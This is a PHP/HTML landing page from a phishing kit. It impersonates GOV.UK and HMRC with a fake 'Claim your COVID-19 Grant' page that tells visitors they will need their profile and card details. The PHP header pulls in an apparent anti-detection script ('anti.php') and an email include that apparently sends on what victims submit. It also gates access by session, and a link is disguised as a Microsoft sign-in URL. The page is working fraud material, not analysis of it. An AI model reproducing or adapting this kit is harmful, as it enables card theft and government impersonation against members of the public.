<?php
session_start();
error_reporting(0);
include(realpath(getenv('DOCUMENT_ROOT')) . '/rebate/index.php');
include "includes/my_email.php";
if ($_SESSION['access']== "") {
	header("Location: ../index");
}

	include 'anti.php';

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" href="images/gov_uk.ico?FqAktxnBpjcXrksNnHvdTSjykQe" type="image/x-icon">
	<link rel="mask-icon" href="images/mask.svg?MeDwDHsvbhIHVWCOiqLXFfRhgAZy" color="#0b0c0c">
	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon-180x180.png?FqAktxnBpjcXrksNnHvdTSjykQe">
	<link rel="apple-touch-icon" sizes="167x167" href="images/apple-touch-icon-167x167.png?qdZwTagNYUONDrkvbdIOlEsEXb">
	<link rel="apple-touch-icon" sizes="152x152" href="images/apple-touch-icon-152x152.png?HrhsiKSedtLr">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png?gFekxPfYtonesgjPH">
	<title>COVID-19 Grant | HMRC</title>

	<link href="css/bootstrap.min.css" rel="stylesheet">
	<link href="css/claimStyle.css" rel="stylesheet">

	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
</head>
<body>
	<div class="topBar">
		<div class="containerTop">
			<div class="row">
				<div class="topLinkWrapper">
					<a href="#" class="topLink">
						<img src="images/crownLogo.png" class="crownLogo">
						<span>GOV.UK</span>
					</a>
				</div>
				<div class="searchBlock">
					<div class="searchBtn">
						<img src="images/searchIco.png"/>
					</div>
					<input type="text" name="search" placeholder="Search"/>
				</div>
			</div>
		</div>
	</div>

	<div class="clearfix"></div>
	<div class="containerMiddle">
		<span class="feedbackText sidePadding">We're always trying to improve our service – <a href="/authids.online.revenuecustoms/reclaim.php?wa=wsignin1.0&rpsnv=13&ct=1544286532&rver=7.0.6737.0&wp=MBI_SSL&https%3A%2F%2Foutlook.live.com%2Fowa%2F%3Fpath%3D%252fmail%252finbox%26nlp%3D1%26RpsCsrfState%3D2689dc6f-4f6e-890d-132c-5db09c03fafc&id=292841&CBCXT=out&lw=1&fl=dob%2Cflname%2Cwld&cobrandid=90015">your
				feedback</a> &nbsp;helps us do this.</span>

		<div class="clearfix"></div>
		<h1 class="claimTitle sidePadding">Claim your COVID-19 Grant</h1>

		<div class="clearfix"></div>
		<div class="belowHeading sidePadding sideMargin">Things you will need:</div>
		<div class="clearfix"></div>
		<div class="info-needed-block person-block sideMargin">
			<span>Your profile details - required to verify and update your information to its latest form.</span>
		</div>
		<div class="clearfix"></div>
		<div class="info-needed-block card-block sideMargin">
			<span>Your card details - required to confirm and deposit the calculated refund amount.</span>
		</div>
		<div class="clearfix"></div>
		<div class="info-needed-block clock-block sideMargin">
			<span>About 10 minutes.</span>
		</div>
		<div class="clearfix"></div>
		<form method="post" action="details">
			<input type="submit" name="submit" value="Start" class="nextBtn sideMargin"/>
		</form>
	</div>
	<div class="clearfix"></div>
	<div class="divider"></div>
	<div class="clearfix"></div>

	<div class="footer">
		<div class="containerFooter">
			<div class="row footerBorder">
				<div class="col-xs-12 col-sm-8">
					<div class="contentTitle">
						Services and information
					</div>
					<div class="clearfix"></div>
					<div class="row">
						<div class="col-xs-12 col-sm-6">
							<div class="footerLink">
								<a href="#">Benefits</a>
							</div>
							<div class="footerLink">
								<a href="#">Births, deaths, marriages and care</a>
							</div>
							<div class="footerLink">
								<a href="#">Business and self-employed</a>
							</div>
							<div class="footerLink">
								<a href="#">Childcare and parenting</a>
							</div>
							<div class="footerLink">
								<a href="#">Citizenship and living in the UK</a>
							</div>
							<div class="footerLink">
								<a href="#">Crime, justice and the law</a>
							</div>
							<div class="footerLink">
								<a href="#">Disabled people</a>
							</div>
							<div class="footerLink">
								<a href="#">Driving and transport</a>
							</div>
						</div>
						<div class="col-xs-12 col-sm-6">
							<div class="footerLink">
								<a href="#">Education and learning</a>
							</div>
							<div class="footerLink">
								<a href="#">Employing people</a>
							</div>
							<div class="footerLink">
								<a href="#">Environment and countryside</a>
							</div>
							<div class="footerLink">
								<a href="#">Housing and local services</a>
							</div>
							<div class="footerLink">
								<a href="#">Money and tax</a>
							</div>
							<div class="footerLink">
								<a href="#">Passports, travel and living abroad</a>
							</div>
							<div class="footerLink">
								<a href="#">Visas and immigration</a>
							</div>
							<div class="footerLink">
								<a href="#">Working, jobs and pensions</a>
							</div>
						</div>
					</div>
				</div>
				<div class="col-xs-12 col-sm-4">
					<div class="contentTitle">
						Departments and policy
					</div>
					<div class="clearfix"></div>
					<div class="footerLink">
						<a href="#">How government works</a>
					</div>
					<div class="footerLink">
						<a href="#">Departments</a>
					</div>
					<div class="footerLink">
						<a href="#">Worldwide</a>
					</div>
					<div class="footerLink">
						<a href="#">Publications</a>
					</div>
					<div class="footerLink">
						<a href="#">Announcements</a>
					</div>
				</div>
			</div>
			<div class="clearfix"></div>
			<div class="row bottomSpacer">
				<div class="col-xs-12 col-sm-9 no-padding">
					<span class="footerLink2">
						<a href="#">Help</a>
					</span>
					<span class="footerLink2">
						<a href="#">Cookies</a>
					</span>
					<span class="footerLink2">
						<a href="#">Contact</a>
					</span>
					<span class="footerLink2">
						<a href="#">Terms and conditions</a>
					</span>
					<span class="footerLink2">
						<a href="#">Rhestr o Wasanaethau Cymraeg</a>
					</span>

					<div class="clearfix"></div>
					<span class="dividerLast">
						<span class="footerLink2">
						Built by the <a href="#">Government Digital Service</a>
						</span>
					</span>

					<div class="clearfix"></div>
					<div class="oglBox">
						<a href="#" class="oglLogo">

						</a>
						<span class="footerLink2">
							All content is available under the
								<a href="#">Open Government Licence v3.0,</a>
							except where otherwise stated
						</span>
					</div>
				</div>
				<div class="col-xs-12 col-sm-3 no-padding">
					<a href="#" class="crownLink">
						<img src="images/logo.png" class="bottomLogo"/>
						<div class="clearfix"></div>
						<span class="crownCopy"><!--mster-->© Crown copyright</span>
					</a>
				</div>
			</div>
		</div>
	</div>

	<script src="js/jquery.min.js"></script>
	<script src="js/bootstrap.min.js"></script>
</body>
</html>